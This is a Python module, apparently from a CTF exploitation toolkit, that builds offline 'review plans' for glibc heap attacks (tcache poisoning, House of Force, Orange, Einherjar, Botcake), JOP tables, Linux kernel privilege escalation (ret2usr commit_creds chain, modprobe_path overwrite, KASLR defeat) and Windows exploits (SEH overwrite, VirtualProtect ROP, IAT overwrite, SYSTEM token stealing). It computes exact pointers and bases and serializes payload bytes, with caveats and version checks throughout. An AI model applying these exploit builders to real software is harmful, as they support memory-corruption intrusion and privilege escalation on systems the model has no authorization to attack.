#!/usr/bin/env python3
"""Offline review plans for advanced heap, JOP, kernel and Windows pwn work.

Nothing in this module runs a binary, opens a socket, or claims that a plan is exploitable.  Exact
arithmetic (safe-linking, leak-to-base, pointer-table serialization) is marked separately from the
human-only exploitability assumptions.  Unsupported glibc/version/architecture combinations decline
instead of emitting a plausible-looking but wrong payload.
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import math
import struct
import sys
from pathlib import Path
from typing import Any


MAX_JSON = 1 << 20
MAX_STEPS = 128
UINT64 = (1 << 64) - 1


class PwnPlanError(ValueError):
    """Unsafe, ambiguous, unsupported, or malformed plan input."""


@dataclasses.dataclass(frozen=True)
class ReviewPlan:
    family: str
    technique: str
    architecture: str
    prerequisites: tuple[str, ...]
    steps: tuple[str, ...]
    computed: dict[str, Any]
    payload: bytes | None = None
    arithmetic_verified: bool = False
    exploitability_verified: bool = False
    warnings: tuple[str, ...] = (
        "offline review plan only; verify every gadget, offset, allocation transition and mitigation",
    )

    def as_dict(self) -> dict[str, Any]:
        return {
            "family": self.family,
            "technique": self.technique,
            "architecture": self.architecture,
            "prerequisites": list(self.prerequisites),
            "steps": list(self.steps),
            "computed": self.computed,
            "payload_hex": self.payload.hex() if self.payload is not None else None,
            "payload_length": len(self.payload) if self.payload is not None else 0,
            "arithmetic_verified": self.arithmetic_verified,
            "exploitability_verified": self.exploitability_verified,
            "sent": False,
            "executed": False,
            "requires_human_review": True,
            "warnings": list(self.warnings),
        }


def _version(value: str) -> tuple[int, int]:
    if not isinstance(value, str) or len(value) > 16:
        raise PwnPlanError("glibc version must be a short 2.MINOR string")
    parts = value.split(".")
    if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
        raise PwnPlanError("glibc version must be MAJOR.MINOR")
    result = int(parts[0]), int(parts[1])
    if result[0] != 2 or not 0 <= result[1] <= 99:
        raise PwnPlanError("only glibc 2.x layouts are supported")
    return result


def _integer(value: Any, name: str, *, bits: int = 64, nonzero: bool = False) -> int:
    if isinstance(value, str):
        try:
            value = int(value, 0)
        except ValueError as exc:
            raise PwnPlanError(f"{name} is not an integer") from exc
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value < (1 << bits):
        raise PwnPlanError(f"{name} must be an unsigned {bits}-bit integer")
    if nonzero and value == 0:
        raise PwnPlanError(f"{name} must be non-zero")
    return value


def _optional_int(config: dict, name: str, *, bits: int = 64, nonzero: bool = False) -> int | None:
    return None if config.get(name) is None else _integer(config[name], name, bits=bits, nonzero=nonzero)


def glibc_features(version: str) -> dict[str, bool | str]:
    ver = _version(version)
    return {
        "version": f"{ver[0]}.{ver[1]}",
        "tcache": ver >= (2, 26),
        "tcache_key_double_free_check": ver >= (2, 29),
        "safe_linking": ver >= (2, 32),
        "malloc_free_hooks": ver < (2, 34),
        "io_vtable_validation": ver >= (2, 24),
        "house_of_force_top_size_check": ver >= (2, 29),
    }


def _request2size(request: int, bits: int) -> int:
    if bits not in (32, 64):
        raise PwnPlanError("heap arithmetic supports 32- or 64-bit glibc")
    request = _integer(request, "request_size", bits=bits)
    if request > (1 << 24):
        raise PwnPlanError("request_size exceeds the bounded planning limit")
    size_sz = bits // 8
    align = 16 if bits == 64 else 8
    minimum = 0x20 if bits == 64 else 0x10
    size = (request + size_sz + align - 1) & ~(align - 1)
    return max(minimum, size)


def _safe_link(position: int, pointer: int, bits: int) -> int:
    position = _integer(position, "fd_position", bits=bits, nonzero=True)
    pointer = _integer(pointer, "target", bits=bits, nonzero=True)
    return (position >> 12) ^ pointer


def _heap_common(config: dict) -> tuple[str, tuple[int, int], int, int, dict]:
    version = str(config.get("glibc_version", ""))
    ver = _version(version)
    bits = int(config.get("bits", 64))
    if bits not in (32, 64):
        raise PwnPlanError("bits must be 32 or 64")
    request = _integer(config.get("request_size", 0x30), "request_size", bits=bits)
    chunk_size = _request2size(request, bits)
    features = glibc_features(version)
    return version, ver, bits, chunk_size, features


def heap_plan(technique: str, **config: Any) -> ReviewPlan:
    """Build a version-gated heap exploitation review plan.

    Exact pointer/base computations are emitted only when every required address/offset was supplied.
    The result never claims that a write/UAF/overlap primitive exists.
    """
    name = str(technique).strip().lower().replace("-", "_")
    version, ver, bits, size, features = _heap_common(config)
    word = bits // 8
    arch = "amd64" if bits == 64 else "i386"
    computed: dict[str, Any] = {"glibc": features, "chunk_size": size,
                                "request_size": int(config.get("request_size", 0x30))}
    warnings = ["allocator state must be reproduced against the exact shipped libc in Docker"]

    if name in {"tcache_dup", "tcache_poison"}:
        if not features["tcache"]:
            raise PwnPlanError("tcache techniques require glibc >= 2.26")
        tcache_max = 0x410 if bits == 64 else 0x208
        if size > tcache_max:
            raise PwnPlanError("requested chunk does not enter the default tcache range")
        target = _optional_int(config, "target", bits=bits, nonzero=True)
        fd_position = _optional_int(config, "fd_position", bits=bits, nonzero=True)
        if target is not None:
            if features["safe_linking"] and fd_position is None:
                raise PwnPlanError("glibc >= 2.32 needs the exact fd_position for safe-linking")
            stored = _safe_link(fd_position, target, bits) if features["safe_linking"] else target
            computed.update({"target": target, "stored_fd": stored,
                             "stored_fd_hex": hex(stored), "fd_position": fd_position})
        prereq = ["UAF/overflow that rewrites a freed tcache entry", "two same-size allocations"]
        steps = ["allocate A and B in the computed bin", "free B then A", "rewrite A.fd with stored_fd",
                 "allocate once to consume A, then again to request the reviewed target"]
        if features["tcache_key_double_free_check"]:
            prereq.append("clear/corrupt tcache key or create an overlap before a literal double-free")
        return ReviewPlan("heap", name, arch, tuple(prereq), tuple(steps), computed,
                          arithmetic_verified=target is not None,
                          warnings=tuple(warnings + ["returned target still must satisfy malloc alignment/layout constraints"]))

    if name == "fastbin_dup":
        fast_max = 0x80 if bits == 64 else 0x40
        if size > fast_max:
            raise PwnPlanError("chunk is outside the default fastbin range")
        target = _optional_int(config, "target", bits=bits, nonzero=True)
        fd_position = _optional_int(config, "fd_position", bits=bits, nonzero=True)
        if target is not None:
            if features["safe_linking"] and fd_position is None:
                raise PwnPlanError("safe-linked fastbin fd requires its exact storage address")
            stored = _safe_link(fd_position, target, bits) if features["safe_linking"] else target
            computed.update({"target": target, "stored_fd": stored, "stored_fd_hex": hex(stored)})
        prereq = ["three compatible chunks or an equivalent intervening free", "fastbin-sized allocation"]
        if features["tcache"]:
            prereq.append("fill/disable the corresponding tcache bin first")
        steps = ("free A, free B, free A (with allocator checks satisfied)",
                 "allocate A, B, then duplicated A", "rewrite the reviewed fd only after confirming headers")
        return ReviewPlan("heap", name, arch, tuple(prereq), steps, computed,
                          arithmetic_verified=target is not None, warnings=tuple(warnings))

    if name == "unsorted_bin_leak":
        if size <= 0x410:
            warnings.append("the requested size may enter tcache first; fill it or choose a larger chunk")
        leak = _optional_int(config, "leak", bits=bits, nonzero=True)
        offset = _optional_int(config, "arena_leak_offset", bits=bits, nonzero=True)
        verified = False
        if (leak is None) != (offset is None):
            raise PwnPlanError("supply both leak and exact arena_leak_offset, or neither")
        if leak is not None:
            if leak <= offset:
                raise PwnPlanError("leak is below its supplied libc offset")
            base = leak - offset
            if base & 0xFFF:
                raise PwnPlanError("computed libc base is not page aligned; offset/leak mismatch")
            computed.update({"leak": leak, "arena_leak_offset": offset,
                             "libc_base": base, "libc_base_hex": hex(base)})
            verified = True
        return ReviewPlan("heap", name, arch,
                          ("freed non-top chunk reaches unsorted bin", "read primitive over fd/bk metadata",
                           "exact main_arena-relative offset from the shipped libc"),
                          ("free a guarded large chunk", "read its fd/bk pointer",
                           "subtract only the supplied exact arena-leak offset", "cross-check a second symbol leak"),
                          computed, arithmetic_verified=verified,
                          warnings=tuple(warnings + ["one page-aligned leak is a candidate; corroborate another libc symbol"]))

    if name == "house_of_force":
        if features["house_of_force_top_size_check"]:
            raise PwnPlanError("House of Force is declined for glibc >= 2.29 top-size integrity checks")
        top = _integer(config.get("top_chunk"), "top_chunk", bits=bits, nonzero=True)
        target = _integer(config.get("target"), "target", bits=bits, nonzero=True)
        if target <= top + 2 * word:
            raise PwnPlanError("target must be after the current top chunk without wraparound")
        forced_chunk_size = target - top - 2 * word
        alignment = 16 if bits == 64 else 8
        minimum = 0x20 if bits == 64 else 0x10
        if forced_chunk_size < minimum or forced_chunk_size % alignment:
            raise PwnPlanError("target does not yield an exact allocator-aligned forced chunk size")
        # request2size(req) adds SIZE_SZ and rounds. Invert it instead of mistakenly passing the
        # desired normalized chunk size as the request (which advances one alignment unit too far).
        evil = forced_chunk_size - word
        if _request2size(evil, bits) != forced_chunk_size:
            raise PwnPlanError("could not invert request2size exactly for this target")
        if evil > (1 << 24):
            raise PwnPlanError("computed request exceeds the bounded planner limit")
        computed.update({"top_chunk": top, "target": target, "candidate_request": evil,
                         "forced_chunk_size": forced_chunk_size,
                         "equation": "request2size(candidate_request) == target - top_chunk - 2*SIZE_SZ"})
        return ReviewPlan("heap", name, arch,
                          ("wilderness/top-size overwrite", "target after top chunk", "glibc <= 2.28"),
                          ("overwrite top size with the reviewed maximum", "request candidate_request",
                           "verify the next returned user pointer before the target write"), computed,
                          arithmetic_verified=True,
                          warnings=tuple(warnings + ["the normalized size equation is exact; still verify the returned pointer before writing"]))

    if name == "house_of_orange":
        if ver > (2, 23):
            raise PwnPlanError("classic House of Orange is supported only through glibc 2.23")
        for field in ("io_list_all", "system", "fake_file"):
            computed[field] = _integer(config.get(field), field, bits=bits, nonzero=True)
        return ReviewPlan("heap", name, arch,
                          ("top-chunk corruption that forces sysmalloc", "legacy unvalidated FILE vtable",
                           "exact _IO_list_all/system addresses from shipped libc"),
                          ("force old top into unsorted bin", "redirect unsorted-bin write toward _IO_list_all",
                           "place reviewed fake FILE/vtable", "trigger abort/flush path"), computed,
                          arithmetic_verified=True,
                          warnings=tuple(warnings + ["use pwn_fsop.py for exact FILE offsets; this plan emits no guessed layout"]))

    if name == "house_of_einherjar":
        victim = _integer(config.get("victim_chunk"), "victim_chunk", bits=bits, nonzero=True)
        fake = _integer(config.get("fake_chunk"), "fake_chunk", bits=bits, nonzero=True)
        if fake >= victim or (victim - fake) % (16 if bits == 64 else 8):
            raise PwnPlanError("fake chunk must precede victim at an allocator-aligned distance")
        computed.update({"victim_chunk": victim, "fake_chunk": fake, "forged_prev_size": victim - fake})
        prereq = ["off-by-one/null or overflow clears PREV_INUSE", "writeable fake chunk with consistent fd/bk"]
        if features["safe_linking"]:
            prereq.append("separately account for safe-linked tcache/fastbin pointers after overlap")
        return ReviewPlan("heap", name, arch, tuple(prereq),
                          ("write forged prev_size and clear PREV_INUSE", "free/consolidate victim backward into fake chunk",
                           "verify overlap boundaries before any metadata rewrite"), computed,
                          arithmetic_verified=True, warnings=tuple(warnings))

    if name == "house_of_botcake":
        if not (2, 29) <= ver <= (2, 31):
            raise PwnPlanError("this strict Botcake plan supports glibc 2.29..2.31 only; newer safe-linking needs a target-specific derivation")
        computed["tcache_count"] = 7
        return ReviewPlan("heap", name, arch,
                          ("glibc 2.29..2.31", "eight same-bin chunks plus a guard", "UAF write after overlap"),
                          ("fill seven-entry tcache", "free victim to unsorted", "free previous chunk and consolidate over victim",
                           "drain one tcache entry", "free overlapped victim through the alternate chunk", "poison only after checking overlap"),
                          computed, arithmetic_verified=True,
                          warnings=tuple(warnings + ["allocation order is a state-machine template, not proof that the target program exposes each action"]))

    if name == "house_of_apple":
        if ver < (2, 24):
            raise PwnPlanError("use the legacy vtable route for glibc < 2.24, not House of Apple")
        return ReviewPlan("heap", name, arch,
                          ("arbitrary write/FILE placement", "exact _IO_wfile_jumps, lock, wide_data and call target"),
                          ("build the structure with pwn_fsop.py house_of_apple", "review every emitted offset",
                           "trigger only the matching wide-file path"), computed,
                          warnings=tuple(warnings + ["pwn_fsop.py is the canonical exact serializer; no duplicate bytes emitted here"]))

    raise PwnPlanError(f"unsupported heap technique: {technique}")


ABI = {
    "amd64": {"bits": 64, "endian": "little", "args": ["rdi", "rsi", "rdx", "rcx", "r8", "r9"],
              "ret": "rip", "sp": "rsp", "syscall_nr": "rax", "syscall": "syscall", "stack_align": 16},
    "i386": {"bits": 32, "endian": "little", "args": ["stack/cdecl"], "ret": "eip", "sp": "esp",
             "syscall_nr": "eax", "syscall": "int 0x80", "stack_align": 4},
    "arm": {"bits": 32, "endian": "little", "args": ["r0", "r1", "r2", "r3"], "ret": "pc/lr", "sp": "sp",
            "syscall_nr": "r7", "syscall": "svc 0", "stack_align": 8},
    "aarch64": {"bits": 64, "endian": "little", "args": ["x0", "x1", "x2", "x3", "x4", "x5", "x6", "x7"],
                "ret": "pc/x30", "sp": "sp", "syscall_nr": "x8", "syscall": "svc 0", "stack_align": 16},
    "mips": {"bits": 32, "endian": "big", "args": ["$a0", "$a1", "$a2", "$a3"], "ret": "$ra", "sp": "$sp",
             "syscall_nr": "$v0", "syscall": "syscall", "stack_align": 8, "delay_slot": True},
    "mipsel": {"bits": 32, "endian": "little", "args": ["$a0", "$a1", "$a2", "$a3"], "ret": "$ra", "sp": "$sp",
               "syscall_nr": "$v0", "syscall": "syscall", "stack_align": 8, "delay_slot": True},
    "riscv64": {"bits": 64, "endian": "little", "args": ["a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7"],
                "ret": "ra", "sp": "sp", "syscall_nr": "a7", "syscall": "ecall", "stack_align": 16},
    "win64": {"bits": 64, "endian": "little", "args": ["rcx", "rdx", "r8", "r9", "stack"], "ret": "rip", "sp": "rsp",
              "stack_align": 16, "shadow_space": 32},
    "win32": {"bits": 32, "endian": "little", "args": ["stack/stdcall-or-cdecl"], "ret": "eip", "sp": "esp",
              "stack_align": 4},
}


def abi_plan(architecture: str, *, endian: str | None = None) -> ReviewPlan:
    arch = architecture.strip().lower()
    if arch not in ABI:
        raise PwnPlanError(f"unsupported architecture: {architecture}")
    abi = dict(ABI[arch])
    if endian is not None:
        if endian not in {"little", "big"}:
            raise PwnPlanError("endian must be little or big")
        # ``mips`` and ``mipsel`` are distinct architecture labels here.  Accepting an
        # override produced bytes whose endianness contradicted the returned architecture.
        if endian != abi["endian"]:
            raise PwnPlanError(f"{arch} plan declines unexpected {endian}-endian mode")
        abi["endian"] = endian
    return ReviewPlan("rop", "abi", arch,
                      ("architecture and endianness confirmed from the executable header",
                       "every gadget effect confirmed in disassembly"),
                      ("control the saved return state", "satisfy argument-register/stack convention",
                       "satisfy stack alignment and delay/shadow-space rules", "transfer through a reviewed gadget/call target"),
                      {"abi": abi}, arithmetic_verified=True)


def jop_table(architecture: str, dispatcher: Any, gadgets: list[Any], table_address: Any,
              *, endian: str | None = None) -> ReviewPlan:
    arch_plan = abi_plan(architecture, endian=endian)
    abi = arch_plan.computed["abi"]
    bits = int(abi["bits"])
    dispatch = _integer(dispatcher, "dispatcher", bits=bits, nonzero=True)
    table = _integer(table_address, "table_address", bits=bits, nonzero=True)
    if not isinstance(gadgets, list) or not 1 <= len(gadgets) <= 128:
        raise PwnPlanError("gadgets must contain 1..128 explicit addresses")
    values = [_integer(value, f"gadgets[{index}]", bits=bits, nonzero=True)
              for index, value in enumerate(gadgets)]
    align = bits // 8
    if table % align or dispatch % 2 or any(value % 2 for value in values):
        raise PwnPlanError("dispatcher/table/gadget addresses fail basic alignment")
    prefix = "<" if abi["endian"] == "little" else ">"
    payload = b"".join(struct.pack(prefix + ("Q" if bits == 64 else "I"), value) for value in values)
    return ReviewPlan("jop", "dispatcher_table", architecture,
                      ("dispatcher semantics verified (load entry, advance, indirect branch)",
                       "each functional gadget returns to dispatcher without clobbering its state"),
                      ("place the serialized table at table_address", "seed dispatcher state with table_address",
                       "transfer to dispatcher after checking every clobber"),
                      {"dispatcher": dispatch, "table_address": table, "entries": values,
                       "word_bits": bits, "endian": abi["endian"]}, payload=payload,
                      arithmetic_verified=True,
                      warnings=("serialization verified; gadget semantics are deliberately unverified until disassembly review",))


def kaslr_base(leaks: list[dict[str, Any]], *, bits: int = 64) -> dict[str, Any]:
    if not isinstance(leaks, list) or not 1 <= len(leaks) <= 32:
        raise PwnPlanError("leaks must contain 1..32 {address,offset} rows")
    bases = []
    offsets = []
    for index, row in enumerate(leaks):
        if not isinstance(row, dict):
            raise PwnPlanError(f"leaks[{index}] must be an object")
        address = _integer(row.get("address"), f"leaks[{index}].address", bits=bits, nonzero=True)
        offset = _integer(row.get("offset"), f"leaks[{index}].offset", bits=bits)
        if address <= offset:
            raise PwnPlanError("leaked address is below its symbol offset")
        base = address - offset
        if base & 0xFFF:
            raise PwnPlanError("KASLR base candidate is not page aligned")
        bases.append(base)
        offsets.append(offset)
    consistent = len(set(bases)) == 1
    # Repeating one observation is not an independent corroborating leak.  Distinct
    # symbol offsets are required before promoting the arithmetic as verified.
    independent = len(set(offsets))
    return {
        "candidate_base": bases[0] if consistent else None,
        "candidate_base_hex": hex(bases[0]) if consistent else None,
        "consistent": consistent,
        "independent_leaks": independent,
        "verified": consistent and independent >= 2,
        "note": ("two or more distinct supplied symbol offsets agree" if consistent and independent >= 2 else
                 "single/inconsistent leak is not enough to promote a kernel base"),
    }


def kernel_plan(technique: str, **config: Any) -> ReviewPlan:
    name = str(technique).strip().lower().replace("-", "_")
    arch = str(config.get("arch", "amd64")).lower()
    if arch not in {"amd64", "aarch64"}:
        raise PwnPlanError("kernel templates support amd64 or aarch64")
    mitigations = config.get("mitigations", {})
    if not isinstance(mitigations, dict):
        raise PwnPlanError("mitigations must be an object")
    computed: dict[str, Any] = {"mitigations": mitigations}
    if config.get("leaks") is not None:
        computed["kaslr"] = kaslr_base(config["leaks"])

    if name == "kaslr_defeat":
        if "kaslr" not in computed:
            raise PwnPlanError("kaslr_defeat needs explicit symbol leaks and known offsets")
        return ReviewPlan("kernel", name, arch,
                          ("leaked pointers are canonical kernel-text symbols", "offsets come from the exact vmlinux/build"),
                          ("subtract each exact symbol offset", "require page alignment", "require independent bases to agree"),
                          computed, arithmetic_verified=bool(computed["kaslr"]["verified"]),
                          warnings=(computed["kaslr"]["note"],))

    if name == "ret2usr":
        if arch != "amd64":
            raise PwnPlanError("this ret2usr frame template is amd64-only")
        if mitigations.get("smep", True) or mitigations.get("smap", True):
            raise PwnPlanError("ret2usr declined while SMEP/SMAP is active; supply a kernel-only bypass plan")
        required = ("pop_rdi", "prepare_kernel_cred", "rax_to_rdi", "commit_creds",
                    "swapgs_iret", "user_rip", "user_cs", "user_rflags", "user_rsp", "user_ss")
        values = {key: _integer(config.get(key), key, nonzero=True) for key in required}
        words = [values["pop_rdi"], 0, values["prepare_kernel_cred"], values["rax_to_rdi"],
                 values["commit_creds"], values["swapgs_iret"], values["user_rip"], values["user_cs"],
                 values["user_rflags"], values["user_rsp"], values["user_ss"]]
        payload = b"".join(struct.pack("<Q", value) for value in words)
        computed.update(values); computed["chain_words"] = words
        return ReviewPlan("kernel", name, arch,
                          ("SMEP=false and SMAP=false confirmed", "stack control in kernel context",
                           "rax_to_rdi gadget semantics exactly confirmed"),
                          ("prepare_kernel_cred(0)", "move returned cred from rax to rdi", "commit_creds(cred)",
                           "swapgs and iretq to captured user state"), computed, payload=payload,
                          arithmetic_verified=True,
                          warnings=("chain bytes are serialized only; exact kernel calling convention/gadget clobbers require review",))

    if name == "modprobe_path":
        address = _integer(config.get("modprobe_path"), "modprobe_path", nonzero=True)
        helper = str(config.get("helper_path", ""))
        if not helper.startswith("/") or len(helper.encode()) > 255 or "\x00" in helper:
            raise PwnPlanError("helper_path must be one absolute NUL-free path <=255 bytes")
        computed.update({"modprobe_path": address, "helper_path": helper,
                         "write_bytes_hex": (helper.encode() + b"\0").hex()})
        return ReviewPlan("kernel", name, arch,
                          ("root-writable helper file prepared inside the challenge environment",
                           "arbitrary kernel write reaches modprobe_path", "user namespaces/environment permit the trigger"),
                          ("write helper_path plus NUL to modprobe_path", "create a malformed executable trigger",
                           "invoke once and inspect the in-band result"), computed,
                          payload=helper.encode() + b"\0", arithmetic_verified=True,
                          warnings=("kernel policy and namespace constraints are target-specific; no trigger is executed",))

    if name == "pt_regs":
        layout = ({"r15": 0x00, "r14": 0x08, "r13": 0x10, "r12": 0x18, "rbp": 0x20,
                   "rbx": 0x28, "r11": 0x30, "r10": 0x38, "r9": 0x40, "r8": 0x48,
                   "rax": 0x50, "rcx": 0x58, "rdx": 0x60, "rsi": 0x68, "rdi": 0x70,
                   "orig_rax": 0x78, "rip": 0x80, "cs": 0x88, "eflags": 0x90,
                   "rsp": 0x98, "ss": 0xA0} if arch == "amd64" else
                  {"x0": 0x00, "x30": 0xF0, "sp": 0xF8, "pc": 0x100, "pstate": 0x108})
        computed["layout"] = layout
        return ReviewPlan("kernel", name, arch,
                          ("entry path and kernel build use the reviewed pt_regs layout",),
                          ("map the controlled syscall/exception registers", "place only explicit values at reviewed offsets",
                           "verify return path before serializing a target-specific frame"), computed,
                          warnings=("layout is a template; BTF/vmlinux for the exact build is authoritative",))

    raise PwnPlanError(f"unsupported kernel technique: {technique}")


def windows_plan(technique: str, **config: Any) -> ReviewPlan:
    name = str(technique).strip().lower().replace("-", "_")
    arch = str(config.get("arch", "win64")).lower()
    if arch not in {"win32", "win64"}:
        raise PwnPlanError("Windows architecture must be win32 or win64")
    bits = 64 if arch == "win64" else 32
    computed: dict[str, Any] = {"abi": ABI[arch]}
    if name == "seh_overwrite":
        if arch != "win32":
            raise PwnPlanError("classic stack SEH overwrite is a 32-bit template")
        next_seh = config.get("next_seh")
        if isinstance(next_seh, str):
            try:
                next_seh = bytes.fromhex(next_seh)
            except ValueError as exc:
                raise PwnPlanError("next_seh must be four hex bytes") from exc
        if not isinstance(next_seh, bytes) or len(next_seh) != 4:
            raise PwnPlanError("next_seh must be exactly four bytes")
        handler = _integer(config.get("handler"), "handler", bits=32, nonzero=True)
        payload = next_seh + struct.pack("<I", handler)
        computed.update({"next_seh_hex": next_seh.hex(), "handler": handler})
        return ReviewPlan("windows", name, arch,
                          ("SafeSEH/SEHOP absent or bypassed", "handler module/address and bad bytes verified"),
                          ("place next-SEH transfer", "place reviewed pop-pop-ret handler", "continue into separately reviewed stage"),
                          computed, payload=payload, arithmetic_verified=True,
                          warnings=("8-byte record serialization verified; exploitability and mitigations are not",))

    if name == "virtualprotect_rop":
        required = ("virtualprotect", "region", "size", "oldprotect", "return_to")
        values = {key: _integer(config.get(key), key, bits=bits, nonzero=True) for key in required}
        computed.update(values)
        computed["new_protect"] = 0x40
        steps = (["set rcx=region, rdx=size, r8=0x40, r9=oldprotect",
                  "reserve 0x20 bytes shadow space and maintain 16-byte stack alignment",
                  "call VirtualProtect then return_to"] if arch == "win64" else
                 ["push stdcall arguments oldprotect,0x40,size,region", "call VirtualProtect then return_to"])
        return ReviewPlan("windows", name, arch,
                          ("VirtualProtect IAT/export address from the exact loaded module",
                           "all register-pop gadgets and clobbers reviewed", "DEP/ASLR/module bases accounted for"),
                          tuple(steps), computed, arithmetic_verified=True,
                          warnings=("argument values verified; no chain bytes emitted without exact gadgets",))

    if name == "iat_overwrite":
        slot = _integer(config.get("iat_slot"), "iat_slot", bits=bits, nonzero=True)
        target = _integer(config.get("target"), "target", bits=bits, nonzero=True)
        computed.update({"iat_slot": slot, "target": target,
                         "target_bytes_hex": target.to_bytes(bits // 8, "little").hex()})
        return ReviewPlan("windows", name, arch,
                          ("IAT slot is writable and belongs to the intended import", "exact module base known",
                           "arbitrary write primitive has the required width"),
                          ("write target pointer to the reviewed IAT slot", "invoke that exact import once"), computed,
                          payload=target.to_bytes(bits // 8, "little"), arithmetic_verified=True)

    if name == "token_steal":
        build = str(config.get("windows_build", "")).strip()
        offsets = config.get("offsets")
        required = {"current_thread_process", "unique_process_id", "active_process_links", "token"}
        if not build or not isinstance(offsets, dict) or set(offsets) != required:
            raise PwnPlanError("token_steal requires an exact windows_build and all four explicit structure offsets")
        parsed = {key: _integer(offsets[key], f"offsets.{key}", bits=32) for key in required}
        if any(value > 0x4000 or value % (8 if arch == "win64" else 4) for value in parsed.values()):
            raise PwnPlanError("structure offsets are implausible/misaligned; verify exact PDB/build")
        computed.update({"windows_build": build, "offsets": parsed})
        return ReviewPlan("windows", name, arch,
                          ("offsets independently recovered from the exact build/PDB", "kernel read/write or code execution primitive"),
                          ("locate current EPROCESS", "walk bounded ActiveProcessLinks for PID 4",
                           "copy the SYSTEM token while preserving reference bits", "restore control safely"), computed,
                          arithmetic_verified=True,
                          warnings=("no hard-coded build offsets are guessed; list traversal and token write remain target-specific",))

    raise PwnPlanError(f"unsupported Windows technique: {technique}")


def build(family: str, config: dict[str, Any]) -> ReviewPlan:
    if not isinstance(config, dict):
        raise PwnPlanError("configuration must be a JSON object")
    if len(config) > 128:
        raise PwnPlanError("configuration has too many fields")
    family = str(family).strip().lower()
    technique = config.get("technique")
    if not isinstance(technique, str) or not technique:
        raise PwnPlanError("configuration needs a technique string")
    kwargs = {key: value for key, value in config.items() if key != "technique"}
    if family == "heap":
        return heap_plan(technique, **kwargs)
    if family == "abi":
        return abi_plan(str(config.get("architecture", technique)), endian=config.get("endian"))
    if family == "jop":
        return jop_table(str(config.get("architecture", "")), config.get("dispatcher"),
                         config.get("gadgets"), config.get("table_address"), endian=config.get("endian"))
    if family == "kernel":
        return kernel_plan(technique, **kwargs)
    if family == "windows":
        return windows_plan(technique, **kwargs)
    raise PwnPlanError("family must be heap, abi, jop, kernel, or windows")


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:
        raise PwnPlanError(message)


def _load(path: str) -> dict:
    raw = Path(path).read_bytes()
    if len(raw) > MAX_JSON:
        raise PwnPlanError("configuration exceeds 1 MiB")
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError, RecursionError) as exc:
        raise PwnPlanError("configuration is not bounded UTF-8 JSON") from exc
    if not isinstance(value, dict):
        raise PwnPlanError("configuration must be a JSON object")
    return value


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(description="offline advanced pwn review-plan builder")
    parser.add_argument("family", choices=("heap", "abi", "jop", "kernel", "windows"))
    parser.add_argument("config", help="bounded JSON configuration")
    try:
        args = parser.parse_args(argv)
        plan = build(args.family, _load(args.config))
        print(json.dumps(plan.as_dict(), indent=2))
        return 0
    except (PwnPlanError, OSError, ValueError, OverflowError) as exc:
        print(f"pwn_advanced: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
